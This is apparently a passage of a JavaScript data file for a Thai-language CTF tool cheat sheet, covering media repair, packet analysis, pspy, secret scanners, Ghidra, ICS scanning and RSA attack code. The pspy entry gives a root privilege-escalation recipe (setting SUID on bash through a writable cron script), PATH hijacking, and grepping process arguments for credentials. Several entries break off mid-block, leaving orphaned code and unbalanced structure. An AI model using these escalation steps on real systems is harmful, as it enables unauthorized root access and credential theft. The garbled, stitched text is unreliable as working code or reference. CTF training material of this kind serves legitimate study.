# ถ้า moov อยู่ท้ายไฟล์และไฟล์ถูกตัดก่อนถึงท้าย มักซ่อมยาก ต้องหา reference file codec เดียวกัน`},
{label:'MP4 / MOV repair recipes',body:`# 1) remux ถ้า ffmpeg อ่านได้
ffmpeg -err_detect ignore_err -i broken.mp4 -c copy fixed.mp4
ffmpeg -i broken.mp4 -map 0 -c copy -movflags +faststart fixed_faststart.mp4

# 2) rebuild by re-encoding ถ้า stream อ่านได้แต่ copy ไม่ผ่าน
ffmpeg -err_detect ignore_err -i broken.mp4 -c:v libx264 -c:a aac fixed_reencode.mp4

# 3) moov atom missing: ใช้ reference จากอุปกรณ์/codec/settings เดียวกัน
untrunc good_reference.mp4 broken.mp4
# output มักชื่อ broken_fixed.mp4 หรือใกล้เคียง

# 4) recover raw H264/AAC from MP4-like data
recover_mp4 broken.mp4 recovered.h264 recovered.aac
ffmpeg -r 30 -i recovered.h264 -i recovered.aac -c copy fixed_from_streams.mp4

# 5) GPAC/MP4Box repair/remux
MP4Box -info broken.mp4
MP4Box -isma broken.mp4 -out fixed_mp4box.mp4
MP4Box -add broken.mp4 fixed_added.mp4

# 6) ถ้ามี mdat แต่ไม่มี ftyp/moov: carve ก่อนแล้วค่อยลอง untrunc
grep -abo "mdat" broken.bin
dd if=broken.bin of=mdat_part.bin bs=1 skip=OFFSET status=none`},
{label:'AVI / MKV / TS / raw video repair',body:`# AVI: RIFF....AVI, index เสียบ่อย
file broken.avi
ffprobe broken.avi
ffmpeg -i broken.avi -c copy -fflags +genpts fixed.avi
mencoder -forceidx -oac copy -ovc copy broken.avi -o fixed_mencoder.avi

# MKV/WebM: EBML container, remux often works
file broken.mkv
mkvinfo broken.mkv
mkvmerge -o fixed.mkv broken.mkv
ffmpeg -err_detect ignore_err -i broken.mkv -c copy fixed_ffmpeg.mkv

# MPEG-TS: sync byte 0x47 every 188 bytes
xxd -g 1 -l 512 broken.ts
ffprobe broken.ts
ffmpeg -err_detect ignore_err -i broken.ts -c copy fixed.mp4

# Raw H264/H265 streams
file stream.bin
grep -abo "$(printf '\\x00\\x00\\x00\\x01')" stream.bin | head
ffmpeg -f h264 -i stream.bin -c copy fixed.mp4
ffmpeg -f hevc -i stream.bin -c copy fixed_h265.mp4`},
{label:'When repair is impossible: extract evidence',body:`# ถ้าข้อมูลหาย/เข้ารหัส/CRC บอกพังหนัก ให้ดึง flag จากสิ่งที่เหลือ
strings -a broken.bin | grep -aiE "flag|pico|ctf|password|secret|token"
strings -a -el broken.bin | grep -aiE "flag|pico|ctf|password|secret|token"
binwalk -e broken.bin
foremost -i broken.bin -o repair_out/foremost
photorec /log /d repair_out/photorec broken.bin

# Extract frames/audio from damaged media if possible
ffmpeg -err_detect ignore_err -i broken.mp4 -vf fps=1 repair_out/frame_%04d.png
ffmpeg -err_detect ignore_err -i broken.mp4 -vn repair_out/audio.wav
ffmpeg -err_detect ignore_err -i broken.mp3 repair_out/audio.wav

# OCR / spectrogram / steg follow-up
tesseract repair_out/frame_0001.png stdout
sox repair_out/audio.wav -n spectrogram -o repair_out/spectrogram.png
zsteg repair_out/frame_0001.png
exiftool repair_out/frame_0001.png`}],
tips:['แก้ width/height ใน header ไม่เหมือน resize: header edit แค่บอก decoder ให้อ่านข้อมูลเดิมด้วยมิติใหม่','PNG หลังแก้ขนาดต้อง update IHDR CRC ไม่งั้น pngcheck จะฟ้อง','BMP/GIF ขนาดเป็น little-endian ส่วน PNG/JPEG SOF เป็น big-endian','MP4 ซ่อมง่ายเมื่อ moov ยังอยู่ ซ่อมยากเมื่อ moov หายและไม่มี reference','untrunc ต้องใช้ไฟล์ดีจากกล้อง/โปรแกรม/codec เดียวกัน ไม่ใช่ MP4 ใดก็ได้','ถ้า ffmpeg -c copy ไม่ผ่าน ให้ re-encode เพื่อดึงข้อมูลที่อ่านได้ออกมาก่อน','MPEG-TS ทนเสียหายกว่า MP4 เพราะ packetized; แปลง TS -> MP4 มักกู้ได้','การซ่อม container มักไม่ต้องแก้ hex เอง ถ้าเครื่องมือ remux/rebuild index ได้'],
checklistTitle:'Image/media repair checklist',
checklist:['แยกก่อนว่าเป็นภาพนิ่ง เสียง วิดีโอ หรือ raw stream','เช็ค magic และ internal markers เช่น IHDR/SOF/ftyp/moov/mdat','ดู width/height และ size fields ว่าผิดชัดเจนไหม','ใช้ decoder อ่านให้ได้ก่อน ถ้าอ่านได้ให้ export/re-encode ทันที','สำหรับ PNG/BMP/GIF ให้ patch dimension ตาม endian ที่ถูกต้อง','สำหรับ MP4 ให้เช็ค ftyp/moov/mdat และลอง remux','ถ้า moov หาย ให้หา reference file codec เดียวกันแล้วใช้ untrunc','ถ้าเป็น raw pixels/audio/video ต้องเดา format + dimensions/sample rate','ใช้ binwalk/foremost ดึงไฟล์ซ้อนก่อน repair ลึก','สุดท้าย grep strings/OCR/spectrogram เพราะ flag อาจอยู่ใน partial data'],
},

desc:'วิเคราะห์ PCAP — filter, follow streams, export files',
about:'Wireshark คือ GUI packet analyzer มาตรฐาน tshark คือ CLI version ที่ใช้ใน script ได้ CTF forensics มักให้ .pcap หรือ .pcapng มา แล้วต้องหา flag จาก traffic',
usage:[{label:'Wireshark display filters',body:`http                          # HTTP ทั้งหมด
http.request.method == "POST" # POST requests
tcp.stream eq 0               # follow TCP stream 0
dns                           # DNS queries
ftp-data                      # FTP file data
frame contains "flag"         # ค้น keyword ใน packets
ip.src == 192.168.1.1         # filter by source IP
http.response.code == 200     # HTTP 200 responses`},
{label:'tshark — batch extraction',body:`# ดู HTTP URIs
tshark -r cap.pcap -Y http -T fields -e http.request.uri

# Export HTTP objects (ไฟล์ที่ download/upload)
tshark -r cap.pcap --export-objects http,./http_files/
mkdir http_files && tshark -r cap.pcap --export-objects http,http_files/

# ดู DNS queries
tshark -r cap.pcap -Y dns -T fields -e dns.qry.name | sort -u

# Follow TCP stream เป็น text
tshark -r cap.pcap -q -z follow,tcp,ascii,0

# ดู credentials (FTP/HTTP Basic Auth)
tshark -r cap.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg`},
{label:'🚩 CTF scenario — pcap มี flag ใน HTTP',body:`# โจทย์: ได้ capture.pcap มา
# Step 1: ดู protocol statistics
tshark -r capture.pcap -q -z io,phs
# เห็นว่ามี HTTP traffic เยอะ

# Step 2: ดู HTTP requests/responses
tshark -r capture.pcap -Y "http" -T fields -e http.request.method -e http.request.uri -e http.response.code

# Step 3: follow stream ที่น่าสนใจ
# ใน Wireshark: คลิก packet → Follow → TCP Stream
# หรือ tshark:
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Step 4: export HTTP objects
mkdir out && tshark -r capture.pcap --export-objects http,out/
ls out/  # → ไฟล์ที่ upload/download

# Step 5: ค้น flag ใน extracted files
grep -ri "flag{" out/
strings out/* | grep -i "CTF\|flag"`}],
tips:['File > Export Objects > HTTP เพื่อ extract ไฟล์จาก pcap','Statistics > Protocol Hierarchy ดู protocol ที่ใช้'],
},

{cat:'forensics',name:'Forensically (Photo)',url:'https://29a.ch/photo-forensics/',tags:['online'],
desc:'Online forensic analysis — ELA, noise analysis, clone detection สำหรับรูปภาพ',
about:'Forensically วิเคราะห์รูปภาพหาร่องรอยการ edit เช่น Error Level Analysis (ELA) แสดงบริเวณที่ถูก edit ต่างจาก compression level ของส่วนอื่น',
usage:[{label:'Error Level Analysis (ELA)',body:`# วิธีใช้:
# 1. เปิด https://29a.ch/photo-forensics/#error-level-analysis
# 2. Upload รูป
# 3. ดูบริเวณที่ brightness ต่างออกไป = บริเวณที่ถูก edit
# ELA ทำงานบน JPEG เท่านั้น (compression artifact)

# ด้วย Python:
from PIL import Image
import io, numpy as np

def ela(img_path, quality=90):
    img = Image.open(img_path)
    buf = io.BytesIO()
    img.save(buf, 'JPEG', quality=quality)
    buf.seek(0)
    img2 = Image.open(buf)
    ela_arr = np.abs(np.array(img) - np.array(img2)) * 10
    return Image.fromarray(ela_arr.astype('uint8'))`}],
},

{cat:'forensics',name:'pspy',url:'https://github.com/DominicBreuker/pspy',tags:['cli'],
desc:'Monitor Linux processes โดยไม่ต้อง root — จับ cron jobs, scripts ที่รันซ้ำ',
about:'pspy monitor process events บน Linux โดยอ่าน /proc filesystem ทำให้ไม่ต้องการ root หรือ sudo รองรับ inotify watches เพื่อดู filesystem events ด้วย ใน CTF/HTB ใช้เพื่อ "ดักจับ" cron jobs หรือ scripts ที่รันเป็น root (UID=0) ซ้ำๆ ซึ่งอาจมี race condition หรือ path ที่ writable อยู่ — นำไปสู่ privilege escalation ได้',
install:`# download static binary ตรงจาก GitHub releases (ไม่ต้อง compile, ไม่ต้องการ deps):
# 64-bit:

# ส่งไปยัง target เหมือนเดิม: python3 -m http.server 8000`,
usage:[{label:'Basic process monitoring',body:`# รันและดู processes:
./pspy64

# ดู output:
# 2024/01/01 00:01:00 CMD: UID=0    PID=1234   | /bin/bash /opt/cleanup.sh
# UID=0 = รันเป็น root
# PID = process ID
# CMD = command ที่รัน

# เพิ่ม filesystem events (inotify):
./pspy64 -f

# ปรับ poll interval (ms):
./pspy64 -i 500   # poll ทุก 0.5s (default: 100ms)`},
{label:'ตีความ output',body:`# ตัวอย่าง output ที่น่าสนใจ:
2024/01/01 00:01:00 CMD: UID=0 PID=999 | /bin/sh -c /opt/monitor.sh
# ↑ script /opt/monitor.sh รันเป็น root ทุกนาที

# ตรวจสอบ permissions ของ script ทันที:
ls -la /opt/monitor.sh
# ถ้า writable → แก้ไข script ให้ทำสิ่งที่ต้องการ

# ตัวอย่าง exploit:
echo 'chmod +s /bin/bash' >> /opt/monitor.sh
# รอ 1 นาที แล้ว:
/bin/bash -p  # bash SUID → root shell`},
{label:'ดักจับ credentials จาก processes',body:`# บาง process ส่ง password ผ่าน command line argument:
./pspy64 | grep -i "pass\|secret\|token\|key\|user"

# ตัวอย่าง:
# CMD: UID=0 | mysql -u root -pSuperSecret123 database
# CMD: UID=1000 | python3 backup.py --key "APIKEY123"

# grep real-time:
./pspy64 | tee pspy_out.txt &
sleep 120 && grep -i "password\|secret" pspy_out.txt`},
{label:'สิ่งที่ต้องมองหา',body:`# 1. Script ที่ writable และรันเป็น root:
find / -writable -name "*.sh" 2>/dev/null

# 2. Binary ที่ไม่ใช่ full path (PATH hijacking):
CMD: UID=0 | python backup.py   # ไม่ใช่ /usr/bin/python
# → สร้าง python ปลอมใน PATH ของเรา

# 3. Config files ที่ readable แต่ contain passwords:
CMD: UID=0 | curl -u admin:password123 http://localhost/api

# 4. Temp files ที่ predictable:
CMD: UID=0 | cp /root/flag /tmp/flag_$(date +%s)`}],
tips:['รอดูอย่างน้อย 2-3 นาที — cron จะรันทุกนาที','UID=0 + writable script = path to root เกือบทุกครั้ง','ถ้าเจอ PATH-based command ใน cron → สร้าง binary ปลอมใน /tmp หรือ home dir แล้วแก้ PATH','pspy ช้ากว่า top/htop แต่เห็น events ที่ flash แล้วหายไปได้ดีกว่ามาก'],

{cat:'osint',name:'Wayback Machine',url:'https://archive.org/web/',tags:['online'],
desc:'ดู snapshot เว็บในอดีต — ค้นหา version เก่า, source code เก่า, credentials',
about:'Wayback Machine เก็บ snapshot ของเว็บไซต์ตั้งแต่ปี 1996 ใช้ใน CTF เพื่อหา version เก่าของเว็บที่อาจมีช่องโหว่, endpoint ที่ถูกลบ, หรือ source code ที่เคย expose',
usage:[{label:'ค้นหา via URL',body:`# เปิดที่ web.archive.org/web/*/https://target.com/*
# ดู snapshots ทั้งหมด แล้วเลือก timestamp

# ค้นผ่าน API:
curl "https://archive.org/wayback/available?url=target.com"
# ดู URLs ทั้งหมดที่ crawl:
curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=list&fl=original&collapse=urlkey"`},
{label:'เทคนิค OSINT อื่น',body:`# Google cache:
cache:target.com
# Google dorks:
site:target.com filetype:pdf
site:target.com inurl:admin
intitle:"index of" "target.com"
intext:"api_key" site:github.com target
# Shodan:
shodan search hostname:target.com
# Censys: search.censys.io`},
{label:'🚩 CTF scenario — หา endpoint เก่า',body:`# โจทย์: website ปัจจุบันไม่มีอะไร แต่ hint บอกว่ามี flag ซ่อนไว้

# Step 1: Wayback Machine ดู snapshots เก่า
# เปิด https://web.archive.org/web/*/https://target.ctf.com/*
# กด calendar view → เลือก snapshot เก่าสุด

# Step 2: ค้นหา path ทั้งหมดที่ crawl ไว้
curl "https://web.archive.org/cdx/search/cdx?url=target.ctf.com/*&output=list&fl=original&collapse=urlkey"
# → เจอ https://target.ctf.com/backup/flag.txt

# Step 3: เปิด archived version ของ path นั้น
curl "https://web.archive.org/web/2023*/https://target.ctf.com/backup/flag.txt"
# → picoCTF{w4yb4ck_m4ch1n3}`}],
tips:['ดู oldest snapshot ก่อนเสมอ','ค้น CDX API หา URLs ทั้งหมดที่ crawl ไว้'],
},

{cat:'osint',name:'TruffleHog',url:'https://github.com/trufflesecurity/trufflehog',tags:['cli'],
desc:'ค้นหา secrets ที่ leak ใน git history, S3, GCS, filesystem — ตรวจ verified secrets',
about:'TruffleHog scan repositories หา leaked credentials: API keys, passwords, private keys, tokens ที่ถูก commit ไว้ใน git history แม้จะถูกลบในภายหลังก็ตาม จุดเด่นของ TruffleHog v3 คือ "verified" — ตรวจสอบกับ API จริงว่า secret ยังใช้งานได้อยู่ไหม ครอบคลุม 700+ credential detectors เหมาะ CTF ที่มี git repo ให้ตรวจ',
install:`go install github.com/trufflesecurity/trufflehog/v3@latest
# หรือ: pip3 install trufflehog (เวอร์ชันเก่า)
# หรือ Docker:
docker run --rm -it trufflesecurity/trufflehog:latest`,
usage:[{label:'Scan git repository',body:`# scan GitHub repo:
trufflehog git https://github.com/target/repo

# scan local repo:
trufflehog git file:///path/to/local/repo

# scan พร้อม verify (ตรวจว่า secret ยังใช้งานได้):
trufflehog git https://github.com/target/repo --only-verified`},
{label:'Scan GitHub organization/user',body:`# scan ทุก repos ใน organization:
trufflehog github --org targetorg

# scan ทุก repos ของ user:
trufflehog github --user username

# scan GitHub repo (ใช้ token ถ้ามี):
trufflehog github --repo https://github.com/target/repo --token GITHUB_TOKEN`},
{label:'Scan sources อื่นๆ',body:`# scan S3 bucket:
trufflehog s3 --bucket bucket-name

# scan Google Cloud Storage:
trufflehog gcs --project project-id --cloud-environment

# scan filesystem:
trufflehog filesystem /path/to/scan

# scan Docker image:
trufflehog docker --image alpine:latest`},
{label:'Output options',body:`# JSON output (ง่ายต่อ parsing):
trufflehog git https://github.com/target/repo --json

# แสดง only verified secrets:
trufflehog git https://github.com/target/repo --only-verified

# ดู raw findings:
trufflehog git https://github.com/target/repo --json | jq '.Raw'

# หา specific secret type:
trufflehog git https://github.com/target/repo --json | jq 'select(.DetectorName=="AWS")'`}],
tips:['--only-verified กรอง false positives ได้ดี — verified = ยังใช้งานได้จริง','ดู git history ทั้งหมด — secret ที่ถูกลบแล้วยังอยู่ใน history','ใช้คู่กับ gitleaks เพื่อ coverage ที่ครบกว่า','ใน CTF ถ้า repo มี history ยาว → scan ก่อนอ่าน code'],
},
{cat:'osint',name:'Gitleaks',url:'https://github.com/gitleaks/gitleaks',tags:['cli'],
desc:'Detect hardcoded secrets ใน git repos — patterns 700+ รูปแบบ',
about:'Gitleaks scan git repositories และ files หา hardcoded secrets โดยใช้ regex patterns กว่า 700+ รูปแบบสำหรับ credential types ต่างๆ: AWS keys, GCP credentials, GitHub/GitLab tokens, private keys, Slack webhooks, Stripe keys ฯลฯ เร็วกว่า TruffleHog แต่ไม่ verify ความถูกต้อง เหมาะสำหรับ quick scan ก่อน',
install:`go install github.com/gitleaks/gitleaks/v8@latest
# หรือ: sudo apt install gitleaks (Kali)
# หรือ: brew install gitleaks (Mac)`,
usage:[{label:'Scan git repository',body:`# scan current directory:
gitleaks detect

# scan specific repo path:
gitleaks detect --source /path/to/repo

# scan และ report:
gitleaks detect --source . --report-format json --report-path report.json`},
{label:'Scan git history',body:`# scan ทุก commits ใน history:
gitleaks detect --source . --log-opts="--all"

# scan specific branch:
gitleaks detect --source . --log-opts="--branch main"

# scan commits ระหว่าง 2 dates:
gitleaks detect --source . --log-opts="--after=2024-01-01 --before=2024-06-01"`},
{label:'ดู report',body:`# JSON report:
cat report.json | jq '.'

# ดู findings ทั้งหมด:
cat report.json | jq '.[] | {Rule: .RuleID, Secret: .Secret, File: .File, Line: .StartLine}'

# ดู secrets ที่พบ (ระวัง — อย่า log เก็บไว้):
cat report.json | jq '.[].Secret'`},
{label:'Custom rules',body:`# สร้าง config file .gitleaks.toml:
[[rules]]
id = "custom-api-key"
description = "Custom API Key Pattern"
regex = '''ctf_key_[a-zA-Z0-9]{32}'''
tags = ["key", "ctf"]`}],
tips:['ใช้ detect (ไม่ใช่ git log) — scan ทั้ง working tree และ history','report.json ดูง่ายกว่า terminal output สำหรับ repos ใหญ่','ใช้คู่กับ TruffleHog: gitleaks เร็วกว่า, TruffleHog verify ได้'],
},

{cat:'reversing',name:'Ghidra',url:'https://ghidra-sre.org/',tags:['java'],
desc:'Free reverse engineering suite จาก NSA — decompile, disassemble, analyze',
about:'Ghidra เป็น reverse engineering tool ฟรีจาก NSA รองรับ x86/x64, ARM, MIPS, PPC ฯลฯ decompile ไปเป็น C-like pseudocode ที่อ่านได้ มี scripting API (Python/Java) สำหรับ automation',
usage:[{label:'Setup + workflow',body:`# Download: https://ghidra-sre.org/
# รัน: ghidraRun (Linux/Mac) หรือ ghidraRun.bat (Windows)

# 5. Functions ซ้ายมือ → หา main/check_flag/verify

{label:'เทคนิคใน Ghidra',body:`# ดู xrefs (ใครเรียก function นี้):
# คลิกขวา function → References > Find References

# Rename variables/functions:

# ค้นใน memory:

{cat:'reversing',name:'GDB + pwndbg',url:'https://github.com/pwndbg/pwndbg',tags:['cli'],
desc:'Dynamic analysis — debug binary, breakpoints, memory inspection',
about:'ใช้ GDB + pwndbg สำหรับ dynamic analysis ของ binary ตั้ง breakpoint ดู register/memory ขณะ runtime ช่วยเข้าใจ behavior จริงของโปรแกรม',
usage:[{label:'Debug + trace',body:`gdb ./crackme
break main           # breakpoint ที่ main
break *0x401234      # breakpoint ที่ address
run                  # เริ่ม
ni                   # next instruction (ไม่เข้า call)
si                   # step into call
finish               # run จนออกจาก function

{cat:'ot',name:'Wireshark ICS Filters',url:'https://www.wireshark.org/',tags:['cli'],
desc:'Display filters สำหรับวิเคราะห์ protocol OT/ICS จาก pcap',
about:'Wireshark รองรับ dissector ของ protocol อุตสาหกรรมจำนวนมาก ใช้แยก PLC/HMI/engineering workstation, function code, tag access, และ network flow โดยไม่ต้องส่ง packet เพิ่มเข้า network',
usage:[{label:'Protocol filters',body:`modbus                         # Modbus/TCP
modbus.func_code == 3           # Read Holding Registers
modbus.func_code == 6 || modbus.func_code == 16  # Write operations
s7comm || s7comm_plus           # Siemens S7
cotp || tpkt                    # ISO-on-TCP layer ที่ S7 ใช้
enip || cip                     # EtherNet/IP + CIP
dnp3                            # DNP3
bacnet                          # BACnet/IP
opcua                           # OPC UA
profinet || pn_io               # Profinet
mms                             # IEC 61850 MMS`},
{label:'Triage views',body:`# หา write activity
modbus.func_code in {5 6 15 16}

# หาเครื่องที่คุยกับ PLC เยอะสุด
Statistics > Conversations
Statistics > Endpoints

# Export evidence
File > Export Packet Dissections > As CSV

# CLI summary
tshark -r ot.pcap -Y "modbus" -T fields \
  -e frame.time -e ip.src -e ip.dst -e modbus.func_code -e modbus.reference_num`}],
tips:['ใช้ display filter แยก read/write operation ก่อนสรุป risk','ดูช่วงเวลาที่มี engineering activity เช่น download/upload logic','ถ้าเจอ broadcast/multicast เยอะให้ดู vendor discovery protocol เพิ่ม'],
},
{cat:'ot',name:'nmap ICS NSE Scripts',url:'https://nmap.org/nsedoc/',tags:['cli'],
desc:'Nmap NSE สำหรับ fingerprint protocol OT แบบเบาและมีขอบเขต',
about:'Nmap มี NSE scripts สำหรับ protocol OT หลายตัว เช่น Modbus, BACnet, EtherNet/IP และ Siemens S7 ใช้ใน lab หรือ network ที่ได้รับอนุญาตเท่านั้น และควรจำกัด port/rate เพื่อไม่กระทบอุปกรณ์จริง',
usage:[{label:'Read-oriented discovery',body:`# Scan เฉพาะ port OT ที่คาดไว้
nmap -sV -Pn -p 102,502,20000,44818,47808 TARGET

# NSE scripts ที่พบบ่อย
nmap -Pn -p502 --script modbus-discover TARGET
nmap -Pn -p44818 --script enip-info TARGET
nmap -Pn -p102 --script s7-info TARGET
nmap -sU -Pn -p47808 --script bacnet-info TARGET

{label:'Evidence fields',body:`# เก็บผลออกไฟล์

# สิ่งที่ควรดึงไป report
- service/version
- device/vendor/product string
- exposed management service
- subnet/VLAN ที่เห็น service

tips:['อย่าใช้ -A หรือ --script vuln กับ OT production โดยไม่ทดสอบก่อน','จำกัด target เป็น IP เดี่ยวหรือ subnet เล็ก','ถ้ามี pcap ให้ใช้ passive evidence ประกอบเสมอ'],
},
{cat:'ot',name:'GRASSMARLIN',url:'https://github.com/nsacyber/GRASSMARLIN',tags:['java'],
desc:'Passive OT network mapper สำหรับสร้าง asset graph จาก pcap',

},
{cat:'ot',name:'Malcolm',url:'https://github.com/cisagov/Malcolm',tags:['cli'],
desc:'Network traffic analysis stack สำหรับ OT/ICS และ enterprise pcap',

{cat:'ot',name:'pymodbus / Snap7 Lab Tools',url:'https://github.com/pymodbus-dev/pymodbus',tags:['python','cli'],

# XOR bruteforce single byte

for k in range(256):

def xor(data, key):
    return bytes([a^b for a,b in zip(data, cycle(key))])

            chr((ord(c)-97+i)%26+97) if c.islower() else c

{label:'RSA helpers',body:`import gmpy2

def rsa_decrypt(c, e, n, p, q):
    phi = (p-1)*(q-1)
    d = int(gmpy2.invert(e, phi))
    m = pow(c, d, n)
    return m.to_bytes((m.bit_length()+7)//8, 'big')

# Small e (cube root) attack
def small_e_attack(c, e=3):
    m, ok = gmpy2.iroot(c, e)
    if ok:
        return int(m).to_bytes((int(m).bit_length()+7)//8, 'big')
    return None

# Fermat factorization (p ≈ q)
def fermat_factor(n):
    a = gmpy2.isqrt(n) + 1
    while True:
        b2 = a*a - n
        b, ok = gmpy2.iroot(b2, 2)
        if ok: return int(a-b), int(a+b)
        a += 1`},

{label:'LSB audio extraction',body:`import wave, struct

def extract_lsb(wav_path, num_bits=8*100):
    w = wave.open(wav_path)
    n = w.getnframes()
    frames = w.readframes(n)
    samples = struct.unpack('<' + 'h'*n, frames)
    bits = ''.join(str(s & 1) for s in samples[:num_bits])
    # แปลง bits → bytes
    msg = int(bits, 2).to_bytes(len(bits)//8, 'big')
    return msg

msg = extract_lsb('audio.wav')
print(msg)`}],

usage:[
{label:'Common Modulus Attack',body:`# ถ้า n เหมือนกัน สอง ciphertext ใช้ e ต่างกัน
# c1 = m^e1 mod n, c2 = m^e2 mod n
# ถ้า gcd(e1,e2) = 1 → recover m

from math import gcd
import gmpy2

def extended_gcd(a, b):
    if a == 0: return b, 0, 1
    g, x, y = extended_gcd(b%a, a)
    return g, y-(b//a)*x, x

g = gcd(e1, e2)
if g != 1: raise Exception("gcd(e1,e2) != 1")

_, a, b = extended_gcd(e1, e2)
if a < 0:
    a = -a; c1 = gmpy2.invert(c1, n)
if b < 0:
    b = -b; c2 = gmpy2.invert(c2, n)
m = (pow(c1,a,n) * pow(c2,b,n)) % n
print(m.to_bytes((m.bit_length()+7)//8,'big'))`},
{label:'Hastad Broadcast Attack',body:`# e=3, ส่ง m ไปยัง 3 receivers (n1,n2,n3 ต่างกัน)

from sympy.ntheory.modular import crt
import gmpy2

ns = [n1, n2, n3]
cs = [c1, c2, c3]
# CRT: หา x s.t. x ≡ ci (mod ni)
_, m3 = crt(ns, cs)
m, ok = gmpy2.iroot(m3, 3)
if ok:
    print(int(m).to_bytes((int(m).bit_length()+7)//8,'big'))`},
{label:'Padding Oracle / LSB Oracle',body:`# LSB Oracle: server บอกว่า m เป็น odd/even
# เป็น binary search บน plaintext space
lo, hi = 0, n
for _ in range(n.bit_length()):
    c = (c * pow(2, e, n)) % n  # shift left
    parity = oracle(c)           # 0=even, 1=odd
    mid = (lo + hi) // 2
    if parity == 0:
        hi = mid
    else:
        lo = mid
m = lo
print(m.to_bytes((m.bit_length()+7)//8,'big'))`},

# ใช้เมื่อ m บางส่วนรู้แล้ว (เช่น prefix/suffix)
# ใน SageMath:
N = Integer(n)
P.<x> = PolynomialRing(Zmod(N), implementation='NTL')
pol = (known_prefix + x)^e - c
roots = pol.small_roots(X=2^64, beta=0.5)
print(roots)`}],

{label:'Extract LSB audio',body:`import wave, struct, numpy as np

def extract_lsb_audio(path, nbits=1):
    w = wave.open(path)
    nframes = w.getnframes()
    raw = w.readframes(nframes)
    w.close()
    n = nframes * w.getnchannels() if hasattr(w,'getnchannels') else nframes
    fmt = '<' + 'h' * (len(raw)//2)
    samples = struct.unpack(fmt, raw)
    bits = ''
    for s in samples:
        for b in range(nbits):
            bits += str((s >> b) & 1)
    data = bytearray()
    for i in range(0, len(bits)-7, 8):
        data.append(int(bits[i:i+8], 2))
    return bytes(data)

about:'Z3 เป็น SMT solver จาก Microsoft Research ใช้ใน CTF reversing เพื่อแก้ constraint equations ที่ได้จาก decompiled code เช่น flag validation ที่เป็น linear equations',
install:'pip3 install z3-solver',
usage:[
{label:'Solve flag constraints',body:`from z3 import *

# สมมติ decompile แล้วเห็น:
# flag[0] + flag[1] == 0xca
# flag[1] * 2 == flag[2]
# flag[0] ^ flag[3] == 0x40

flag = [BitVec(f'f{i}', 8) for i in range(4)]
s = Solver()

# printable characters
for f in flag:
    s.add(f >= 0x20, f <= 0x7e)

# constraints from decompiled code
s.add(flag[0] + flag[1] == 0xca)
s.add(flag[1] * 2 == flag[2])
s.add(flag[0] ^ flag[3] == 0x40)

if s.check() == sat:
    m = s.model()
    result = bytes([m[f].as_long() for f in flag])
    print('[FLAG]', result.decode())`}],
